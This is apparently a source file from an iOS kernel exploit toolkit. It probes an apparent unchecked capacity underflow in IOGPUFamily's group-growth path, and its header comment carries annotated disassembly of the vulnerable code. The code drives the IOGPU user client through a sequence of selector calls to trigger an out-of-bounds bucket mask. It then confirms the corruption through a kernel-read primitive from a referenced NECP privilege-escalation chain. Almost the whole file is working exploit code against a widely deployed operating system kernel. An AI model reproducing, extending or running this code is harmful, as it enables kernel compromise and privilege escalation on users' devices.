/* IOGPU group-growth OOB write - focused probe for the SECOND, UNCHECKED
 * capacity path in IOGPUFamily 129.3.2 (iOS 26.2 / 23C55).
 *
 * THE TWO CAPACITY SITES
 *   A) creation path, 0x9f60fcc:
 *          0x9f60fe4: cmp  w2, #0x3f
 *          0x9f60fe8: b.hi 0x9f61028      ; capacity > 63 required
 *          0x9f60fec: mov  w8, #0x40      ; else capacity := 64
 *          0x9f61020: mov  x19, #0        ; ... and return NULL
 *      => the iOS 18.4 fix lives HERE. capacity < 64 is refused.
 *
 *   B) growth path, 0x9f74df8 / 0x9f64910:
 *          0x9f64938: ldr  w8, [x0, #0x20]
 *          0x9f64940: mov  x21, w8        ; count
 *          0x9f649ac: bl   0x9f611ec      ; -> init, capacity = 2*count
 *          0x9f755cc: lsr  w9, w22, #6
 *          0x9f755d0: sub  w9, w9, #1     ; obj+40 = (capacity>>6)-1
 *      => NO lower bound on capacity here. count == 1 -> capacity == 2
 *         -> mask == 0xffffffff.
 *
 *   init @ 0x9f61200 then stores the mask as the bucket index mask of the
 *   group, and the bitmap is only (capacity+63)/8 bytes, so a huge mask
 *   turns every later bucket index into an out-of-bounds access.
 *
 *   Path B is reached from the GROW inside the group object, i.e. when a
 *   resource is ADDED to an existing group. The user-facing entry for that
 *   is the same selector 8 with command 130 (s_group_add_resources,
 *   0x9f606d8) - the fix in (A) does not cover it.
 *
 * COMMANDS inside selector 8 (the group dispatcher 0x9f7314c):
 *   struct[0]  = command
 *     0   -> 0x9f60050  s_new_resource      (guarded, capacity > 63)
 *     3   ->              s_new_resource group (what we already use)
 *     130 -> 0x9f606d8  s_group_add_resources
 *   struct[56] = capacity (cmd 3) / resource handle (cmd 130)
 *   struct[60] = dimension
 *   struct[64] = second dimension
 *   struct[72] = third parameter
 *   struct[24] = pointer to an args blob (>= 16 bytes), NULL is accepted
 *
 * WHAT THIS PROBE DOES
 *   1. new_resource   (cmd 0, capacity 64)  -> capture the returned handle
 *   2. new group      (cmd 3, capacity 64)  -> capture the group pointer
 *   3. add resource   (cmd 130, handle)     -> triggers the growth path
 *   4. read back the group object with the B12 read channel and print
 *      obj+0x20 (count) and obj+0x28 (mask). mask == 0xffffffff after
 *      step 3 == the underflow, live, on this build.
 *
 *   Every step is logged durably BEFORE it runs, so a kernel panic still
 *   leaves the exact step in Documents/group_oob.log.
 */
#import <IOKit/IOKitLib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"
#include "nk_trace.h"
#include <stdarg.h>

#define ol(fmt, ...) do { nk_log(fmt, ##__VA_ARGS__); \
                            nk_doc_log("group_oob.log", fmt, ##__VA_ARGS__); } while (0)

#define IOGPU_SEL        8u
#define CMD_NEW_RESOURCE 0u
#define CMD_NEW_GROUP   3u
#define CMD_ADD_RES    130u
#define STRUCT_SZ      0x100u

static uint8_t g_args[64];

static void build(uint8_t *in, uint32_t cmd, uint64_t f56, uint64_t f60,
                  uint64_t f64, uint64_t f72)
{
    memset(in, 0, STRUCT_SZ);
    uint64_t c = cmd;
    memcpy(in + 0, &c, 8);
    memcpy(in + 56, &f56, 8);
    memcpy(in + 60, &f60, 8);
    memcpy(in + 64, &f64, 8);
    memcpy(in + 72, &f72, 8);
    /* struct[80] is the w27 gate of the new_resource path (0x9f600dc:
     * cbz w26 -> fail). It must be non-zero. */
    uint64_t w27 = 1;
    memcpy(in + 80, &w27, 8);
    /* struct[24] is a pointer to a >= 16 byte args blob (0x9f600c8: cmp x3,#16). */
    uintptr_t ap = (uintptr_t)g_args;
    memcpy(in + 24, &ap, 8);
}

static int call_sel(io_connect_t conn, uint32_t cmd, uint64_t f56, uint64_t f60,
                    uint64_t f64, uint64_t f72, uint8_t *out, size_t *outn)
{
    static uint8_t in[STRUCT_SZ];
    build(in, cmd, f56, f60, f64, f72);
    *outn = *out ? *outn : 0;
    size_t on = 0x200;
    memset(out, 0, on);
    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, STRUCT_SZ, out, &on);
    *outn = on;
    return (int)kr;
}

void nk_iogpu_group_oob_run(int trigger)
{
    nk_doc_log_open("group_oob.log");
    ol("[grp] === IOGPU group-growth OOB probe (23C55) mode=%s ===",
       trigger ? "TRIGGER" : "READ-ONLY");
    ol("[grp] durable log: Documents/group_oob.log");
    if (!trigger) ol("[grp] READ-ONLY: steps 1+2 only, no add-resource, no crash");

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("IOGPU"));
    if (!svc) { ol("[grp] no IOGPU service"); return; }

    io_connect_t conn = MACH_PORT_NULL;
    uint32_t use_type = 0; (void)use_type;
    for (uint32_t t = 0; t <= 40 && !conn; t++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) {
            conn = c; use_type = t;
            ol("[grp] OPEN IOGPU type=%u", t);
        }
    }
    if (!conn) { ol("[grp] no usable type"); return; }

    static uint8_t out[0x200];
    size_t on = 0;

    /* The readback needs the B12/NECP kernel-read channel. Bring it up here
     * so the probe is self-contained (requires the unsafe_necp_dataonly pref
     * in Settings -> Privilege Escalation). */
    {
        uint8_t probe[8];
        int rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
        if (rr != 0) {
            ol("[grp] read channel down (kr=%d) - running the NECP chain", rr);
            nk_dataonly_necp_chain();
            rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
            ol("[grp] read channel after chain: kr=%d", rr);
            if (rr != 0) ol("[grp] WARNING: no kernel read channel; the mask check will not work");
        } else {
            ol("[grp] read channel already up");
        }
    }

    /* ---- step 1: new_resource (cmd 0) with capacity 64 ---- */
    ol("[grp] STEP 1 new_resource cmd=0 cap=64");
    int kr = call_sel(conn, CMD_NEW_RESOURCE, 64, 0, 0, 0, out, &on);
    ol("[grp] STEP 1 -> kr=0x%x outN=%zu", kr, on);
    uint64_t handle = 0;
    for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
        uint64_t v = 0;
        memcpy(&v, out + w, 8);
        ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
        if (!handle && v && v < 0x1000) handle = v;
    }
    ol("[grp] STEP 1 handle candidate = 0x%llx", (unsigned long long)handle);

    /* ---- step 2: new group (cmd 3) with capacity 64 ---- */
    ol("[grp] STEP 2 new_group cmd=3 cap=64");
    kr = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, out, &on);
    ol("[grp] STEP 2 -> kr=0x%x outN=%zu", kr, on);
    uint64_t grp = 0;
    for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
        uint64_t v = 0;
        memcpy(&v, out + w, 8);
        ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
    }
    memcpy(&grp, out + 0x10, 8);
    ol("[grp] STEP 2 group ptr = 0x%016llx", (unsigned long long)grp);

    /* ---- step 4 (read back the group BEFORE any add) ---- */
    if (grp) {
        uint8_t obj0[0x40];
        memset(obj0, 0, sizeof(obj0));
        int r0 = nk_do_kread(grp, obj0, sizeof(obj0));
        ol("[grp] PRE-ADD read -> %d", r0);
        if (r0 == 0) {
            uint32_t c0 = 0, m0 = 0;
            memcpy(&c0, obj0 + 0x20, 4);
            memcpy(&m0, obj0 + 0x28, 4);
            ol("[grp] PRE-ADD obj+0x20 count=%u  obj+0x28 MASK=0x%08x", c0, m0);
        }
    }

    if (!trigger) {
        ol("[grp] READ-ONLY done (use the TRIGGER button to drive the growth path)");
        IOServiceClose(conn);
        return;
    }

    /* ---- step 3: add the resource to the group -> growth path ---- */
    ol("[grp] TRIGGER: adding the resource to the group; this may panic the kernel");
    for (uint32_t h = 0; h < 12; h++) {
        uint64_t cand = h == 0 ? handle : h;
        ol("[grp] STEP 3 add_resource cmd=130 handle=%llu", (unsigned long long)cand);
        kr = call_sel(conn, CMD_ADD_RES, cand, 1, 0, 0, out, &on);
        ol("[grp] STEP 3 -> kr=0x%x outN=%zu", kr, on);
        if (kr == 0) {
            for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
                uint64_t v = 0;
                memcpy(&v, out + w, 8);
                ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
            }
            break;
        }
    }

    /* ---- step 4: read the group object back ---- */
    if (grp) {
        ol("[grp] STEP 4 read group object");
        uint8_t obj[0x80];
        memset(obj, 0, sizeof(obj));
        int r = nk_do_kread(grp, obj, sizeof(obj));
        ol("[grp] STEP 4 kread -> %d", r);
        if (r == 0) {
            uint32_t count = 0, mask = 0;
            memcpy(&count, obj + 0x20, 4);
            memcpy(&mask, obj + 0x28, 4);
            ol("[grp]   obj+0x20 count=%u", count);
            ol("[grp]   obj+0x28 MASK=0x%08x %s", mask,
               mask == 0xffffffffu ? "<<< UNDERFLOW LIVE" : "");
            for (uint32_t w = 0; w + 8 <= sizeof(obj); w += 8) {
                uint64_t v = 0;
                memcpy(&v, obj + w, 8);
                ol("[grp]   obj[+0x%02x]=0x%016llx", w, (unsigned long long)v);
            }
        }
    } else {
        ol("[grp] no group pointer, skipping readback");
    }
    IOServiceClose(conn);
    ol("[grp] === done ===");
}
